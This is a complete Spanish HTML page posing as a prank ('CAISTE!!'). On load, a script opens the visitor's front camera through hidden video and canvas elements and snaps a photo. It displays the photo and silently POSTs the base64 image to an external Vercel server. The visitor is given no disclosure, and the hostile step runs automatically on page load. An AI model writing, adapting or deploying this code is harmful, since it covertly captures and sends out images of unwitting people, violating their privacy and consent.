<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CAISTE!!ðŸ¤£</title>
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
      background: linear-gradient(to bottom, #000000, #ff0000);
    }
    #foto {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
    }
    #video, #canvas { display: none; }
    #mensaje {
      position: fixed; bottom: 20px; width: 100%;
      text-align: center; font-size: 2em; color: white;
      font-family: Arial, sans-serif; text-shadow: 0 0 10px #000;
    }
  </style>
</head>
<body>
  <img id="foto" src="" alt="Foto Sorpresa" />
  <div id="mensaje">CAISTE!!ðŸ¤£</div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const foto = document.getElementById('foto');
    const ctx = canvas.getContext('2d');

    const constraints = {
      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
    };

    async function iniciarCamara() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;

        video.addEventListener('play', () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          tomarFoto();
        });
      } catch (err) {
        console.error("Error al acceder a la cÃ¡mara:", err);
      }
    }

    async function tomarFoto() {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataURL = canvas.toDataURL('image/jpeg');
      const base64 = dataURL.split(',')[1];

      foto.src = dataURL;
      const tracks = video.srcObject.getTracks();
      tracks.forEach(track => track.stop());
      video.style.display = 'none';

      // Enviar al backend Vercel
      try {
        const res = await fetch('https://vercel-proyecto-seven.vercel.app/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ base64 })
        });
        const data = await res.json();
        console.log('Imagen guardada:', data);
      } catch (err) {
        console.error('Error enviando imagen:', err);
      }
    }

    iniciarCamara();
  </script>
</body>
</html>
